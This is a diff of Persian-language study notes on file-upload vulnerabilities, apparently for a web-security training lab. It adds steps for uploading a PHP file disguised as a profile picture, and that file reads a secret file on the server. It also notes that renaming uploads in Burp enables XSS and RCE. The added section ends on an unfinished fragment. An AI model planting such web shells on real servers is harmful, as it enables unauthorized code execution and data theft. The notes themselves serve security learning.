@@ -4,7 +4,13 @@
 - با تغییر نام فایل آپلود شده در Burp می توانیم حملات XSS و RCE انجام دهیم
 
 ## Exploitation
-- Basic PHP web shell to read a directory : ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```
+- آپلود شل PHP
+  - برای عکس پروفایل، فایل *test.php* را با محتوای زیر را آپلود می کنیم
+  - آدرس عکس آواتار را وارد می کنیم تا نتیجه اجرای کد PHP نمایش داده شود
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+- س
 
 ## Bypass
 - Content type
